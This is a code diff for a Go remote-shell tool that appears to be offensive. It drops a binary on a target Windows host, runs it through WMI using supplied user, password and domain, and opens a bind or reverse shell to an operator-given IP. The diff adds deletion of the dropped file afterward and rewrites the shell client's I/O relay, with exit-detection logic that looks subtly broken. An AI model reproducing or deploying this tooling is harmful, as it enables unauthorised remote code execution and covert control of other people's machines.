@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"golang.org/x/sys/windows"
 	"io"
@@ -8,7 +9,6 @@ import (
 	"net"
 	"os"
 	"os/signal"
-	"strings"
 	"sync"
 	"syscall"
 	"time"
@@ -66,9 +66,9 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 		// Launch the named pipe binary using WMI
 		// We will use the same WMI code as before, but we will pass the pipe name as an argument
 		// Will always launch in the context of the executing user
-		cmd := fmt.Sprintf("cmd.exe /k %s -port %d -shell %s", targetFile, port, shell)
+		cmd := fmt.Sprintf("cmd.exe /c %s -port %d -shell %s", targetFile, port, shell)
 		if reverse {
-			cmd = fmt.Sprintf("cmd.exe /k %s -port %d -ip %s -shell %s", targetFile, port, ip, shell)
+			cmd = fmt.Sprintf("cmd.exe /c %s -port %d -ip %s -shell %s", targetFile, port, ip, shell)
 		}
 		err = executeRemoteWMI(target, cmd, "C:\\Windows\\Temp", user, pass, domain)
 		if err != nil {
@@ -122,6 +122,11 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 		handleReverseConnect(&port)
 	}
 
+	err = os.Remove(targetFile)
+	if err != nil {
+		log.Println(err.Error())
+	}
+
 }
 
 func handleReverseConnect(port *int) {
@@ -131,81 +136,69 @@ func handleReverseConnect(port *int) {
 	}
 	defer listener.Close()
 
-	// Log server start
 	log.Printf("Reverse Shell Client listening on port %d...\n", *port)
-
-	// Accept the connection
 	conn, err := listener.Accept()
 	if err != nil {
 		log.Fatalf("Error accepting connection: %v", err)
 	}
+	defer conn.Close()
 
-	// Get remote address
-	remoteAddr := conn.RemoteAddr().String()
-	log.Printf("Shell server connected from %s", remoteAddr)
-
-	// Set up console for terminal interaction
+	// Console Stuff
 	inHandle, outHandle, origInMode, origOutMode := saveConsoleSettings()
 	configureConsole(inHandle, outHandle)
 	defer restoreConsole(inHandle, outHandle, origInMode, origOutMode)
-
-	// Handle signals for clean exit
 	setupSignalHandler(inHandle, outHandle, origInMode, origOutMode)
-
-	// Get initial terminal size and send to server
 	w, h, err := getConsoleSize(outHandle)
 	if err == nil {
 		log.Printf("Initial terminal size: %dx%d", w, h)
 		sendTerminalSizeTCP(conn, w, h)
 	}
-
-	// Create a done channel for coordination
 	done := make(chan struct{})
 	var wg sync.WaitGroup
 	wg.Add(2)
 
-	// Forward data from server to local stdout
+	// Server -> STDOUT
+	doneReceiving := make(chan struct{})
 	go func() {
 		defer wg.Done()
+		defer close(doneReceiving)
 		buffer := make([]byte, 4096)
 
 		for {
 			select {
 			case <-done:
 				return
+			case <-doneReceiving:
+				return
 			default:
 				n, err := conn.Read(buffer)
 				if err != nil {
 					if err != io.EOF {
 						log.Printf("Error reading from server: %v", err)
-						fmt.Printf("\nConnection error: %v\n", err)
 					} else {
 						log.Printf("Server closed connection")
 					}
-					close(done)
 					return
 				}
-
 				_, err = os.Stdout.Write(buffer[:n])
 				if err != nil {
 					log.Printf("Error writing to stdout: %v", err)
-					close(done)
 					return
 				}
 			}
 		}
 	}()
 
-	// Forward data from local stdin to server
+	// STDIN -> Server
 	go func() {
 		defer wg.Done()
-
-		// Start a goroutine to monitor terminal size changes
-		go monitorTerminalSizeTCP(conn, outHandle, done)
-
+		defer close(done)
 		buffer := make([]byte, 4096)
+		commandBuffer := bytes.NewBuffer(nil)
 		for {
 			select {
+			case <-doneReceiving:
+				return
 			case <-done:
 				return
 			default:
@@ -214,85 +207,43 @@ func handleReverseConnect(port *int) {
 					if err != io.EOF {
 						log.Printf("Error reading from stdin: %v", err)
 					}
-					close(done)
 					return
 				}
 
-				// Check for exit commands
-				if n > 0 {
-					input := string(buffer[:n])
-
-					// Check for exact matches to quit or exit commands
-					if input == "quit\r\n" || input == "exit\r\n" ||
-						input == "quit\n" || input == "exit\n" {
-						log.Printf("Exit command detected: %q", input)
-
-						// Send special exit sequence to server
-						exitSequence := "\x1B_EXIT_SHELL\x1B\\"
+				// TODO - Probably more efficient way to do this
+				// Basically we are checking if exit+ENTER is the last 5 bytes in stdin
+				commandBuffer.Write(buffer[:n])
+				c := commandBuffer
+				reverseCommand := reverseByteSliceCopy(c.Bytes())
+				if len(reverseCommand) > 4 {
+					if reverseCommand[0] == 13 && reverseCommand[1] == 116 && reverseCommand[2] == 105 && reverseCommand[3] == 120 && reverseCommand[4] == 101 {
+						// Represents exit+ENTER in reverse
+						exitSequence := "EXIT_SHELL"
 						_, err = conn.Write([]byte(exitSequence))
 						if err != nil {
 							log.Printf("Error sending exit sequence: %v", err)
+							return
 						}
-
-						// Wait a moment for the server to process
-						time.Sleep(100 * time.Millisecond)
-
-						// Restore console and exit
-						fmt.Println("\nExiting shell session.")
-						restoreConsole(inHandle, outHandle, origInMode, origOutMode)
-						os.Exit(0)
+						time.Sleep(1 * time.Second)
+						return
 					}
-
-					// Also check if the line ends with these commands (for powershell prompt)
-					// This catches cases like "PS C:\> exit"
-					trimmedInput := strings.TrimSpace(input)
-					if strings.HasSuffix(trimmedInput, "quit") || strings.HasSuffix(trimmedInput, "exit") {
-						// Only handle if it's likely a command (preceded by space)
-						parts := strings.Fields(trimmedInput)
-						if len(parts) > 0 && (parts[len(parts)-1] == "quit" || parts[len(parts)-1] == "exit") {
-							log.Printf("Exit command detected in input: %q", input)
-
-							// First send the original input to allow the shell to process it naturally
-							_, err = conn.Write(buffer[:n])
-							if err != nil {
-								log.Printf("Error writing to server: %v", err)
-								close(done)
-								return
-							}
-
-							// Then wait briefly and send our special exit sequence
-							time.Sleep(100 * time.Millisecond)
-							exitSequence := "\x1B_EXIT_SHELL\x1B\\"
-							_, err = conn.Write([]byte(exitSequence))
-							if err != nil {
-								log.Printf("Error sending exit sequence: %v", err)
-							}
-
-							// Wait for server response
-							time.Sleep(200 * time.Millisecond)
-
-							// Restore console and exit
-							fmt.Println("\nExiting shell session.")
-							restoreConsole(inHandle, outHandle, origInMode, origOutMode)
-							os.Exit(0)
-						}
-					}
+				}
+				if commandBuffer.Len() > 50 {
+					commandBytes := commandBuffer.Bytes()
+					commandBuffer.Write(commandBytes[len(commandBytes)-1:])
 				}
 
 				_, err = conn.Write(buffer[:n])
 				if err != nil {
 					log.Printf("Error writing to server: %v", err)
-					fmt.Printf("\nConnection error: %v\n", err)
-					close(done)
 					return
 				}
 			}
 		}
 	}()
-
-	// Wait for all goroutines to complete
+	go monitorTerminalSizeTCP(conn, outHandle, done)
 	wg.Wait()
-	log.Printf("Client terminating normally")
+	restoreConsole(inHandle, outHandle, origInMode, origOutMode)
 }
 
 func handleConnect(host *string, port *int) {
@@ -308,74 +259,62 @@ func handleConnect(host *string, port *int) {
 	}
 	defer conn.Close()
 
-	// Print success to stdout and log
-	log.Printf("Connected to server")
-
-	// Save original console settings
+	// Console Stuff
 	inHandle, outHandle, origInMode, origOutMode := saveConsoleSettings()
-
-	// Configure console for terminal emulation
 	configureConsole(inHandle, outHandle)
-
-	// Make sure to restore console mode on exit
 	defer restoreConsole(inHandle, outHandle, origInMode, origOutMode)
-
-	// Handle signals for clean exit
 	setupSignalHandler(inHandle, outHandle, origInMode, origOutMode)
-
 	w, h, err := getConsoleSize(outHandle)
 	if err == nil {
 		log.Printf("Initial terminal size: %dx%d", w, h)
 		sendTerminalSizeTCP(conn, w, h)
 	}
-
-	// Create a mechanism to coordinate between goroutines
 	done := make(chan struct{})
 	var wg sync.WaitGroup
 	wg.Add(2)
 
-	// Forward data from server to local stdout
+	// Server -> STDOUT
+	doneReceiving := make(chan struct{})
 	go func() {
 		defer wg.Done()
+		defer close(doneReceiving)
 		buffer := make([]byte, 4096)
 
 		for {
 			select {
 			case <-done:
 				return
+			case <-doneReceiving:
+				return
 			default:
 				n, err := conn.Read(buffer)
 				if err != nil {
 					if err != io.EOF {
 						log.Printf("Error reading from server: %v", err)
-						fmt.Printf("\nConnection error: %v\n", err)
 					} else {
 						log.Printf("Server closed connection")
 					}
-					close(done)
 					return
 				}
-
 				_, err = os.Stdout.Write(buffer[:n])
 				if err != nil {
 					log.Printf("Error writing to stdout: %v", err)
-					close(done)
 					return
 				}
 			}
 		}
 	}()
 
-	// Forward data from local stdin to server
+	// STDIN -> Server
 	go func() {
 		defer wg.Done()
-
-		// Start a goroutine to monitor terminal size changes
-		go monitorTerminalSizeTCP(conn, outHandle, done)
-
+		defer close(done)
 		buffer := make([]byte, 4096)
+		commandBuffer := bytes.NewBuffer(nil)
 		for {
 			select {
+			case <-doneReceiving:
+				return
 			case <-done:
 				return
 			default:
@@ -384,48 +323,42 @@ func handleConnect(host *string, port *int) {
 					if err != io.EOF {
 						log.Printf("Error reading from stdin: %v", err)
 					}
-					close(done)
 					return
 				}
 
-				// Check for exit commands
-				if n > 0 {
-					input := string(buffer[:n])
-
-					// Check for exact matches to quit or exit commands
-					if input == "quit\r\n" || input == "exit\r\n" ||
-						input == "quit\n" || input == "exit\n" {
-						log.Printf("Exit command detected: %q", input)
-
-						// Send special exit sequence to server
-						exitSequence := "\x1B_EXIT_SHELL\x1B\\"
+				// TODO - Probably more efficient way to do this
+				commandBuffer.Write(buffer[:n])
+				c := commandBuffer
+				reverseCommand := reverseByteSliceCopy(c.Bytes())
+				if len(reverseCommand) > 4 {
+					if reverseCommand[0] == 13 && reverseCommand[1] == 116 && reverseCommand[2] == 105 && reverseCommand[3] == 120 && reverseCommand[4] == 101 {
+						// Represents exit+ENTER in reverse
+						exitSequence := "EXIT_SHELL"
 						_, err = conn.Write([]byte(exitSequence))
 						if err != nil {
 							log.Printf("Error sending exit sequence: %v", err)
+							return
 						}
-
-						// Wait a moment for the server to process
-						time.Sleep(100 * time.Millisecond)
-
-						// Restore console and exit
-						fmt.Println("\nExiting shell session.")
-						restoreConsole(inHandle, outHandle, origInMode, origOutMode)
-						os.Exit(0)
+						time.Sleep(1 * time.Second)
+						return
 					}
+				}
+				if commandBuffer.Len() > 50 {
+					commandBytes := commandBuffer.Bytes()
+					commandBuffer.Write(commandBytes[len(commandBytes)-1:])
 				}
 
 				_, err = conn.Write(buffer[:n])
 				if err != nil {
 					log.Printf("Error writing to server: %v", err)
-					fmt.Printf("\nConnection error: %v\n", err)
-					close(done)
 					return
 				}
 			}
 		}
 	}()
+	go monitorTerminalSizeTCP(conn, outHandle, done)
 	wg.Wait()
-	log.Printf("Client terminating normally")
+	restoreConsole(inHandle, outHandle, origInMode, origOutMode)
 }
 
 // Save original console settings
